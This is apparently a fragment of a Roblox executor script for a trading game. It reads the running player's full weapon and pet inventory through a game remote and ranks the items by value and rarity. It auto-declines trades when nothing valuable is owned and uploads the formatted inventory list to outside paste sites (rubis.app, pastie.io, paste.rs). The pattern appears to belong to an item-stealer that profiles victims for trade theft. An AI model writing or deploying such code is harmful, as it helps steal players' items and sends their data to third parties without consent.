local function scanInventory()
	filteredInventory   = {}
	totalInventoryValue = 0
	totalItemCount      = 0
	for k in pairs(rarityCount) do rarityCount[k] = 0 end

	local fullInv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
	local minRarityIndex = table.find(rarityOrder, minRarity)

	local function processItem(itemId, itemCount)
		local entry = itemValueMap[itemId]
		if not entry then return end
		if minValuePerItem > entry.value then return end
		local idx = table.find(rarityOrder, entry.rarity)
		if not idx or idx > minRarityIndex then return end

		totalItemCount      += itemCount
		totalInventoryValue += entry.value * itemCount
		if rarityCount[entry.rarity] then
			rarityCount[entry.rarity] += itemCount
		end
		table.insert(filteredInventory, {
			value  = entry.value * itemCount,
			name   = entry.name,
			rarity = entry.rarity,
			type   = entry.type,
			chroma = entry.chroma,
			id     = itemId,
			n      = itemCount
		})
	end

	for itemId, itemCount in pairs(fullInv.Weapons.Owned) do
		processItem(itemId, itemCount)
	end
	for petId, petCount in pairs(fullInv.Pets.Owned) do
		processItem(petId, petCount)
	end

	if totalItemCount <= 0 then
		pcall(function()
			ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
		end)
	end

	table.sort(filteredInventory, function(a, b)
		return tonumber(a.value) > tonumber(b.value)
	end)
end

local function buildInventoryString()
	local byRarity = {}
	for _, item in ipairs(filteredInventory) do
		local rarity = item.rarity
		byRarity[rarity] = byRarity[rarity] or {}
		local line = item.name .. " (" .. string.lower(item.type) .. ") value: " .. roundToThreeDecimals(item.value)
		if item.chroma then line = "Chroma " .. line end
		if item.n > 1  then line = "x" .. item.n .. " " .. line end
		table.insert(byRarity[rarity], line)
	end

	local lines = {}
	for _, rarity in ipairs(rarityOrder) do
		if byRarity[rarity] then
			table.insert(lines, rarity == "Classic" and "Vintage" or rarity)
			for _, l in ipairs(byRarity[rarity]) do
				table.insert(lines, " - " .. l)
			end
		end
	end
	return table.concat(lines, "\n")
end

local function truncate(str, max)
	if #str <= max then return str end
	local t = str:sub(1, max)
	local nl = t:match(".*()\n")
	if nl then t = t:sub(1, nl - 1) end
	return t .. "\n...and more"
end

local function uploadInventoryToPaste(content)
	local body = "-- rewrite --\n\n\n" .. content

	local ok, res = pcall(request, {
		Url = "https://api.rubis.app/v2/scrap?public=true",
		Method = "POST",
		Body = body
	})
	if ok and res and res.StatusCode == 200 then
		return HttpService:JSONDecode(res.Body).raw
	end

	ok, res = pcall(request, {
		Url = "https://pastie.io/documents",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = body
	})
	if ok and res and res.StatusCode == 200 then
		return "https://pastie.io/raw/" .. HttpService:JSONDecode(res.Body).key
	end

	ok, res = pcall(request, {
		Url = "https://paste.rs/",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = body
	})
	if ok and res and (res.StatusCode == 201 or res.StatusCode == 206) then
		return res.Body
	end

	return "paste upload failed"
end

